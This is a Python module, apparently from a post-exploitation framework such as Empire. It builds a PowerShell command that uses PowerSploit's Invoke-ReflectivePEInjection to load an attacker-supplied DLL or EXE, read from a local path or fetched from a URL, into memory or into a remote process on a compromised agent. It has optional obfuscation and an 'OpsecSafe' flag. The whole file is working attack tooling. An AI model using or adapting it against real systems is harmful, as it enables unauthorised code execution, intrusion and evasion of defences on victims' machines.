from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ReflectivePEInjection',

            'Author': ['@JosephBialek'],

            'Description': ("Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load "
                            "a DLL/EXE in to the PowerShell process or reflectively load a DLL in to a "
                            "remote process."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcId' : {
                'Description'   :   'Process ID of the process you want to inject a Dll into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DllPath' : {
                'Description'   :   '(Attacker) local path for the PE/DLL to load.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'PEUrl' : {
                'Description'   :   'A URL containing a DLL/EXE to load and execute.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ExeArgs' : {
                'Description'   :   'Optional arguments to pass to the executable being reflectively loaded.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ForceASLR' : {
                'Description'   :   'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
                'Required'      :   True,
                'Value'         :   'False'
            },
            'ComputerName' : {
                'Description'   :   'Optional an array of computernames to run the script on.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "\nInvoke-ReflectivePEInjection"

        #check if dllpath or PEUrl is set. Both are required params in their respective parameter sets.
        if self.options['DllPath']['Value'] == "" and self.options['PEUrl']['Value'] == "":
            print helpers.color("[!] Please provide a PEUrl or DllPath")
            return ""
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if option.lower() == "dllpath":
                    if values['Value'] != "":
                        try:
                            f = open(values['Value'], 'rb')
                            dllbytes = f.read()
                            f.close()

                            base64bytes = base64.b64encode(dllbytes)
                            scriptEnd += " -PEbase64 " + str(base64bytes)

                        except:
                            print helpers.color("[!] Error in reading/encoding dll: " + str(values['Value']))
                elif values['Value'].lower() == "true":
                    scriptEnd += " -" + str(option)
                elif values['Value'] and values['Value'] != '':
                    scriptEnd += " -" + str(option) + " " + str(values['Value'])

        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
